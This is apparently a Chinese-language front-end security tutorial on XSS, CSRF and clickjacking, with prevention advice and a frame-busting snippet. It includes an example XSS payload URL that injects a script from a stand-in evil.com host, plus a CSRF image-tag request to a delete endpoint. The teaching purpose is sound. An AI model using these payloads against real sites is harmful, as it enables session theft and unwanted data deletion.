---
tags: ['前端安全', 'xss', 'csrf', '跨站请求伪造','跨站脚本攻击']
---
# 针对前端的攻击及防范

>#### 参考链接：
> 1. [Web前端安全不可忽视](https://blog.csdn.net/_sai_/article/details/49125667)
> 2. [前端常见的攻击方式及预防方法](https://www.jianshu.com/p/a5ff8a23b423)
> 3. [CSRF攻击原理及防御](https://www.cnblogs.com/shytong/p/5308667.html)
> 4. [用大白话谈谈XSS与CSRF](https://segmentfault.com/a/1190000007059639)

## 一、 XSS（跨站脚本攻击）
XSS是Cross Site Scripting的缩写，即跨站点脚本攻击。XSS发生在浏览器端。当用户打开了一个页面，且该页面未对第三方来源数据做有效拦截时，就很容易收到恶意攻击从而泄露数据。例如某网站中代码中有如下代码：
```javascript
eval(location.hash.slice(1))
```
攻击者就可以通过在url中构建特殊的hash值，达到恶意攻击的目的，例如：
```javascript
http://host/test.html#document.write("<script/src=//www.evil.com/evil.js></script>")
```
这样攻击者就可以向该网站注入恶意代码以获取用户的登陆信息。

::: tip 总结
XSS攻击的特点就是：尽一切办法在目标网站上执行第三方的恶意代码。
:::
#### 防范
_**1. 不要相信用户输入，做好输入转码**_

_**2. 不要相信任何第三方请求数据，如：jsonp请求到的数据**_

一个更安全的方式是使用新标准HTML5中引入的CORS，这项技术在国内还很少使用，但在国外使用的例子已经有很多了。JSONP技术提供的跨域数据访问钻了同源策略的空子，算是技巧性的方案，而CORS则是从规范上专门定义的一项跨域数据访问的技术。CORS比JSONP更先进和可靠，并且已经得到了主流浏览器的支持。JSONP只能用GET请求，而CORS不受这样的限制，甚至可以通过AJAX发起请求。CORS主要的原理是在服务器端设置Access-Control-Allow-Origin头，从而限定了服务请求的发起端。如下是一个设置的示例：

## 二、 CSRF（跨站请求伪造）
CSRF是Cross Site Request Forgery，即为跨站请求伪造，通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]。指攻击者通过一些手段诱导用户发起一些用户无法察觉的恶意请求，即伪造的请求。

假设某个网站通过如下接口进行数据删除：
```javascript
http://host/path/del?id=xx
```
攻击者可以在此网站上发布一张图片，且将图片地址设置成此链接。这样，当用户访问到这张图片时，就相当于发起了一个删除数据的请求，且用户本身并未察觉。

## 三、 界面操作劫持

界面操作劫持是利用视觉欺骗，诱导用户操作。比如在可见的输入框中覆盖一个不可见的框，用户输入的数据就会被劫持。例如：

攻击者制作一个网页，并将目标网站作为iframe引入并完整显示，同时在目标网站输入框位置放置自己的透明输入框。如果用户进入此页面，且未注意到网址的不同，当用户在输入账号信息的时候，数据就会被劫持。
#### 防范
_**阻止第三方将你的网站设置成iframe,**_

在网站中添加如下代码：
```html
<style id="antiClickjack">body{display:none !important;}</style>
````
同时添加类似如下的JavaScript代码：
```javascript
<script type="text/javascript">
   if (self === top) {
       var antiClickjack = document.getElementById("antiClickjack");
       antiClickjack.parentNode.removeChild(antiClickjack);
   } else {
       top.location = self.location;
   }
</script>

```